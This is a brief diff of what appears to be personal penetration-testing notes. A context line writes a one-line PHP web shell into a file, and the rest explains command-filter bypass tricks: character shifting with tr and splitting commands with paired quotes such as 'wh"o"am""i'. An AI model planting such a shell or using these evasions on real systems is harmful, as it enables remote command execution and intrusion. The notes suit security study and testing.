@@ -1,5 +1,6 @@
 sudo sh -c "echo '<?php system($_GET['cmd']); ?>' >> 666.php"
 
+
 characters shifts:
   man ascii
   echo $(tr '!-}' '"-~'<<<[)
@@ -8,3 +9,6 @@ characters shifts:
     '!-}':  set1, asscii from ! to -
     '"-~':  set2, asscii from " to ~
     <<<[:   pass [ to tr '!-}' '"-~'  ,  so pass [ get \
+
+
+adding pairs of "" or '' between letters: The important things to remember are that we cannot mix types of quotes and the number of quotes must be even. e.g. "wh"o"am""i"
